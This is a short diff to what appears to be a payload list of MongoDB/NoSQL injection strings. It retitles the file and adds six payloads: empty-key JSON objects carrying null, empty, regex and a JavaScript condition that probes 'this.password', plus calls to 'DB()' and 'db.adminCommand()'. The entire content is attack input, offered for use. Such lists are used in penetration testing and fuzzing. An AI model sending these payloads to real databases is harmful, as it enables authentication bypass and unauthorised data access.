@@ -1,2 +1,9 @@
--e # mongodb Payload 7
+-e # MongoDB Injection Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+{"": null}
+{"": ""}
+{"": "this.password.length > 0"}
+{"": ".*"}
+DB()
+db.adminCommand()
